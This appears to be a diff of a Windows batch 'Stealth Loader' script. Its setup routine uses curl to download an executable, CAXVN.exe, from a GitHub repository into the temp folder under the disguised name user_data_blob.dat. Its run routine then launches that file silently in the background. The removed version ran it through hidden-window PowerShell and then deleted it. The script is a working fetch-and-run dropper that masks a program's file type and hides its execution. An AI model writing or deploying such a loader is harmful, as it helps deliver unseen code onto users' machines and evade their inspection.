@@ -52,74 +52,58 @@ goto :STEALTH_MENU
 
 :SETUP
 cls
-echo ==========================================
-echo         *** STEALTH MENU - SETUP ***
-echo ------------------------------------------
+echo ==================================================
+echo              STEALTH LOADER - SETUP
+echo --------------------------------------------------
 echo [*] Initializing setup process...
 timeout /t 1 >nul
-
 echo [1/4] Preparing environment...
+set "DISGUISED_EXE=%temp%\user_data_blob.dat"
+if exist "%DISGUISED_EXE%" del /f /q "%DISGUISED_EXE%" >nul 2>&1
 timeout /t 1 >nul
-
 echo [2/4] Connecting to GitHub repository...
 timeout /t 1 >nul
-
 echo [3/4] Downloading payload: CAXVN.exe
-curl -# -L -o "%temp%\CAXVN.exe" "https://github.com/maxyprime/stealthloaderv2/raw/main/CAXVN.exe"
-
-if exist "%temp%\CAXVN.exe" (
-    echo [✓] Download complete.
-    echo [4/4] Verifying and finalizing setup...
-    timeout /t 1 >nul
-    echo [✓] CAXVN.exe is ready in temp directory.
-    echo ------------------------------------------
-    echo [✔] Setup completed successfully.
-) else (
-    echo [✖] ERROR: Download failed.
-    echo [!] Check your internet connection or GitHub link.
-    echo ------------------------------------------
+curl -L -o "%DISGUISED_EXE%" "https://github.com/maxyprime/stealthloaderv2/raw/main/CAXVN.exe"
+if not exist "%DISGUISED_EXE%" (
+    echo [X] Download failed. Please check your connection or GitHub link.
     pause
-    goto STEALTH_MENU
+    goto MENU
 )
-
-echo ------------------------------------------
+echo [✓] Download complete.
+echo [4/4] Verifying and finalizing setup...
+timeout /t 1 >nul
+echo [✓] %DISGUISED_EXE% is ready.
+echo --------------------------------------------------
+echo [✓] Setup completed successfully.
+echo --------------------------------------------------
 pause
-goto STEALTH_MENU
+goto MENU
+
 
 
 
 :RUN
 cls
-echo ==========================================
-echo         *** STEALTH MENU - RUN ***
-echo ------------------------------------------
+echo ==================================================
+echo              STEALTH LOADER - RUN
+echo --------------------------------------------------
 echo [*] Preparing to launch disguised EXE...
-
-:: Ensure EXE exists
-if not exist "%temp%\CAXVN.exe" (
-    echo [✖] ERROR: EXE not found. Run setup first.
+if not exist "%temp%\user_data_blob.dat" (
+    echo [X] Disguised EXE not found. Please run Setup first.
     pause
-    goto STEALTH_MENU
+    goto MENU
 )
+echo [*] Running silently...
+start "" /b "%temp%\user_data_blob.dat"
 
-:: Rename EXE to DAT
-set "DISGUISED_EXE=%temp%\user_data_blob.dat"
-copy /Y "%temp%\CAXVN.exe" "%DISGUISED_EXE%" >nul 2>&1
-
-echo [*] Running in background...
-
-:: Use powershell to run it without console and wait
-powershell -WindowStyle Hidden -Command "Start-Process '%DISGUISED_EXE%' -WindowStyle Hidden -Wait"
-
-echo [✓] EXE has exited. Cleaning up...
-
-:: Cleanup disguised copy
-del /f /q "%DISGUISED_EXE%" >nul 2>&1
-
-echo [✓] Cleanup complete.
-echo ------------------------------------------
+:: Optional: Wait and return to menu after launch
+timeout /t 2 >nul
+echo [✓] EXE launched as disguised .dat file.
+echo --------------------------------------------------
 pause
-goto STEALTH_MENU
+goto MENU
+
 
 
 
